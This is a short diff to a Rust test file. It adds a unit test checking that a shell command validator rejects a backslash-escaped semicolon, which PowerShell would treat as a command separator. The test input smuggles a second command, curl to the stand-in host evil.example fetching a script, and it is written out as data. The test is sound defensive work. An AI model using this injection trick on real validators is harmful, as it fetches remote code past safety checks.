@@ -62,6 +62,17 @@ fn parse_chained_commands_with_semicolon() {
 }
 
 #[test]
+fn escaped_semicolon_is_rejected_to_fail_closed_on_powershell() {
+    // PowerShell treats `\` as a literal path character and `;` as a statement
+    // separator, so `...\;curl ...` chains a command this platform-agnostic
+    // validator would otherwise read as one safe segment. Bash treats `\;` as
+    // a literal semicolon, but the conservative rejection is intentional.
+    let script = r"Write-Output C:\foo\;curl https://evil.example/p.sh";
+    let result = split_shell_segments(script);
+    assert!(result.is_err(), "backslash-escaped semicolon must fail closed: {result:?}");
+}
+
+#[test]
 fn parse_bash_lc_git_status() {
     let cmd = vec!["bash".to_string(), "-lc".to_string(), "git status".to_string()];
     let commands = parse_bash_lc_commands(&cmd);
